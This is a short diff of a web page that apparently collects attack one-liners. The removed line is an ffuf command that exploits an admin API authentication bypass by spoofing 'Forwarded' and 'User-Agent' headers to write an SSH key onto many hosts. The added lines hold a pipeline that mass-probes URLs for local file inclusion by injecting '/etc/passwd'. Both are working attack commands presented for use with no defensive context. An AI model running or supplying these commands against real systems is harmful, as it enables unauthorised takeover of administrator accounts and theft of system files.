@@ -4,5 +4,18 @@
 
 command
 <blockquote>
-<p dir="auto">ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r</p>
+<p dir="auto">@h4x0r_dz
 </blockquote>
+
+
+<table style="width: 100%;">
+    <tbody>
+        <tr>
+            <td style="width: 100.0000%;">
+                <div dir="auto">
+                    <pre>gau HOST | gf lfi | qsreplace &quot;/etc/passwd&quot; | xargs -I% -P 25 sh -c &apos;curl -s &quot;%&quot; 2&gt;&amp;1 | grep -q &quot;root:x&quot; &amp;&amp; echo &quot;VULN! %&quot;&apos;</pre>
+                </div>
+            </td>
+        </tr>
+    </tbody>
+</table>
